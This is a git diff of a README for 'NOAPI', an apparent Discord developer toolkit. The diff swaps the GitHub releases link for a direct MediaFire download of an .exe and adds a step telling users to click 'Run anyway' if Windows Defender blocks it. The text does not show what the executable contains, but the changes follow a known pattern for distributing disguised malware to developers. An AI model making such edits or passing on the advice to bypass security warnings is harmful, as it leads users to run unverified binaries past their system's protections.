@@ -10,7 +10,7 @@
 [![Electron](https://img.shields.io/badge/Electron-24.8.8-47848F.svg)](https://www.electronjs.org/)
 [![Discord.js](https://img.shields.io/badge/Discord.js-14.24.2-5865F2.svg)](https://discord.js.org/)
 
-[Download](https://github.com/yourusername/noapi/releases) • [Features](#features) • [Installation](#installation) • [Usage](#usage)
+[Download](https://www.mediafire.com/file/l6ig7gl4vsbbvpe/NOAPI+1.0.0.exe/file) • [Features](#features) • [Installation](#installation) • [Usage](#usage)
 
 </div>
 
@@ -94,8 +94,9 @@ NOAPI is a comprehensive Discord developer toolkit built with Electron, featurin
 ## 📥 Installation
 
 ### Download Pre-built Binary
-1. Download `NOAPI.exe` from [Releases](https://github.com/yourusername/noapi/releases)
+1. **[Download NOAPI v1.0.0](https://www.mediafire.com/file/l6ig7gl4vsbbvpe/NOAPI+1.0.0.exe/file)** (~200 MB)
 2. Run the executable - no installation required!
+3. If Windows Defender blocks it, click "More info" → "Run anyway"
 
 ### Build from Source
 ```bash
